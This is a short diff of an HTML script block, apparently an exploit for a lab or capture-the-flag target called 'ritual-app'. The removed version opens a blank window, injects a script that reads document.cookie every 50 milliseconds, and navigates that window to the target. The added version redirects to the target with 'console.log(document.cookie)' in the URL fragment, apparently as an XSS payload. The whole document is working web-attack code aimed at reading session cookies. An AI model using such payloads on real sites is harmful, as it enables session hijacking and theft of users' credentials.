@@ -1,15 +1,3 @@
 <script>
-let w = open("about:blank");
-
-w.document.write(`
-<script>
-setInterval(()=>{
-    try{
-        console.log(document.cookie)
-    }catch(e){}
-},50)
-<\/script>
-`);
-
-w.location = "http://ritual-app:5000/";
+location = "http://ritual-app:5000/#console.log(document.cookie)"
 </script>
